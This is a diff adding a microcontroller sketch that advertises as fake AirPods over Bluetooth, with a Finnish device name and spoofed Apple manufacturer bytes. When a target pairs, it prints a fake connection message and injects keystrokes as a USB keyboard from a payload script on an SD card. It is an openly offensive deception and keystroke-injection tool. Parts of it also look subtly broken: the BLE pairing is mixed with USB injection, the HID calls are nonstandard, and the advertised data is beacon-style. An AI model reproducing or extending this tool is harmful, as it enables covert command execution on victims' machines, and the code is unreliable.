@@ -1,0 +1,92 @@
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
+#include "USB.h"
+#include "HID.h"
+#include "FS.h"
+#include "SD.h"
+
+#define DEVICE_NAME "Pistä mitä tahansa musiikkia"  // Name shown in Bluetooth settings
+#define SCRIPT_FILE "/payload.txt"  // Your custom script file
+
+bool deviceConnected = false;
+
+class MyCallbacks : public BLEServerCallbacks {
+    void onConnect(BLEServer* pServer) {
+        deviceConnected = true;
+        Serial.println("Target paired. Triggering AirPods Pro connection...");
+
+        delay(3000);
+        Serial.println("AirPods Pro connected ✅");
+
+        // Activate BadUSB
+        delay(2000);
+        HID.begin();
+        executePayload();  // Run script from file
+    }
+
+    void onDisconnect(BLEServer* pServer) {
+        deviceConnected = false;
+    }
+};
+
+void executePayload() {
+    if (!SD.begin()) {
+        Serial.println("SD Card not detected!");
+        return;
+    }
+
+    File file = SD.open(SCRIPT_FILE);
+    if (!file) {
+        Serial.println("No payload file found!");
+        return;
+    }
+
+    Serial.println("Executing payload...");
+
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        line.trim();  // Remove extra spaces
+
+        if (line.startsWith("DELAY ")) {
+            delay(line.substring(6).toInt());
+        } else if (line.startsWith("STRING ")) {
+            HID.print(line.substring(7));
+        } else if (line.startsWith("ENTER")) {
+            HID.sendKeyStroke(KEY_RETURN);
+        } else if (line.startsWith("CTRL ")) {
+            HID.sendKeyStroke(line.substring(5).toInt(), MOD_CONTROL_LEFT);
+        } else if (line.startsWith("ALT ")) {
+            HID.sendKeyStroke(line.substring(4).toInt(), MOD_ALT_LEFT);
+        } else if (line.startsWith("GUI ")) {
+            HID.sendKeyStroke(line.substring(4).toInt(), MOD_GUI_LEFT);
+        }
+    }
+
+    file.close();
+    Serial.println("Payload execution complete!");
+}
+
+void setup() {
+    Serial.begin(115200);
+
+    // Initialize BLE
+    BLEDevice::init(DEVICE_NAME);
+    BLEServer* pServer = BLEDevice::createServer();
+    pServer->setCallbacks(new MyCallbacks);
+
+    BLEAdvertising* pAdvertising = pServer->getAdvertising();
+
+    // Fake AirPods manufacturer data
+    uint8_t manufacturerData[] = {
+        0x4C, 0x00, 0x02, 0x15, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xC5
+    };
+    pAdvertising->addManufacturerData(std::string((char*)manufacturerData, sizeof(manufacturerData)));
+
+    pAdvertising->start();
+    Serial.println(" AirPods is now discoverable.");
+}
+
+void loop() {
+    // Keep BLE running
+}
